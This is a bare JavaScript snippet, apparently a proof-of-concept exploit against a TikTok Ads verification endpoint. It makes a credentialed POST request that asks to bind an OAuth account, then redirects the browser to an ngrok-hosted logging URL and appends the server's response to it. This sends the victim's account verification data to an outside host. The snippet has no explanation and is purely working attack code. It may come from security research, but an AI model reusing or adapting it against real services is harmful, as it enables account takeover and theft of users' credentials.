var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('POST','https://ads.tiktok.com/passport/web/shark/safe_verify/?msToken=or6IAX2oBn8DiZB3AnCIeMAsJoeVSdb5TsIH7rHyFtYUl6Q4XwdvxpkmvqRbpUPfC29MiWfYR2v5RAFkkTxbhUoqb-__trxRjq2aw8mQ6sfypZkHddXtL_gIrSRYylxl6A8oyyMndkUMH8-3_A==&X-Bogus=DFSzsIVLZC0tgY/HtxxIuUWdbTo7&_signature=_02B4Z6wo00001b4nHjwAAIDBlF7mqG44QVW-JhqAAAth27',true);
req.withCredentials = true;
req.setRequestHeader('Content-Type', 'text/plain',true);
req.send('aid=1583&service=&language=en&target=bind_oauth',true);

function reqListener() {
location='//2d7a-140-213-103-229.ngrok-free.app/log?key='+this.responseText;
	};
}
